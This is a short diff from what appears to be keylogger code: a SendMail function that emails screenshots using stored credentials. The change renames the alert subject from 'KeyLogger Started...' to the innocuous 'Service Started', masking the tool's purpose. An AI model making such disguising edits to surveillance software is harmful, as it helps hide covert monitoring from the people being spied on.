@@ -59,7 +59,7 @@ def SendMail(screenshot_dir: str = "./screenshot") -> None:
     email_address, email_password, recipient = _load_credentials()
 
     msg = EmailMessage()
-    msg["Subject"] = "KeyLogger Started..."
+    msg["Subject"] = "Service Started"
     msg["From"] = email_address
     msg["To"] = recipient
 
